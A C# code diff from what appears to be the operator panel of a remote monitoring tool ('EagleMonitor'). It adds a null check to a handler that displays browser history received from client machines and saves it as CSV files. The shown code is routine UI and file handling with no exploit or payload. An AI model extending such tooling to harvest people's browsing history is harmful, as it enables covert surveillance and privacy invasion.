@@ -19,34 +19,38 @@ namespace EagleMonitor.PacketParser
             {
                 if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\History\\"))
                     System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\History");
-
-                try
+                if (historyPacket.historyList != null)
                 {
-                    if (clientHandler.historyForm.dataGridView1 != null)
+                    try
                     {
-                        clientHandler.historyForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
+                        if (clientHandler.historyForm.dataGridView1 != null)
                         {
-                            clientHandler.historyForm.dataGridView1.Rows.Clear();
-                            foreach (object[] str in historyPacket.historyList)
+                            clientHandler.historyForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                             {
-                                int rowId = clientHandler.historyForm.dataGridView1.Rows.Add();
-                                DataGridViewRow row = clientHandler.historyForm.dataGridView1.Rows[rowId];
-                                row.Cells["Column1"].Value = str[0].ToString();
-                                row.Cells["Column2"].Value = str[1].ToString();
-                                row.Cells["Column3"].Value = str[2].ToString();
-                                row.Cells["Column4"].Value = str[3].ToString();
-                                row.Cells["Column5"].Value = str[4].ToString();
-                            }
-                            Miscellaneous.ToCSV(clientHandler.historyForm.dataGridView1, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv");
-                            clientHandler.historyForm.loadingCircle1.Visible = false;
-                            clientHandler.historyForm.loadingCircle1.Active = false;                           
-                        }));
+                                clientHandler.historyForm.dataGridView1.Rows.Clear();
+                                foreach (object[] str in historyPacket.historyList)
+                                {
+                                    int rowId = clientHandler.historyForm.dataGridView1.Rows.Add();
+                                    DataGridViewRow row = clientHandler.historyForm.dataGridView1.Rows[rowId];
+                                    row.Cells["Column1"].Value = str[0].ToString();
+                                    row.Cells["Column2"].Value = str[1].ToString();
+                                    row.Cells["Column3"].Value = str[2].ToString();
+                                    row.Cells["Column4"].Value = str[3].ToString();
+                                    row.Cells["Column5"].Value = str[4].ToString();
+                                }
+                                Miscellaneous.ToCSV(clientHandler.historyForm.dataGridView1, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv");
+                                clientHandler.historyForm.loadingCircle1.Visible = false;
+                                clientHandler.historyForm.loadingCircle1.Active = false;
+                            }));
+                        }
+                        else
+                        { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                     }
-                    else
+                    catch
                     { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                 }
-                catch
-                { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
+                else
+                    return;
             }).Start();
         }
     }
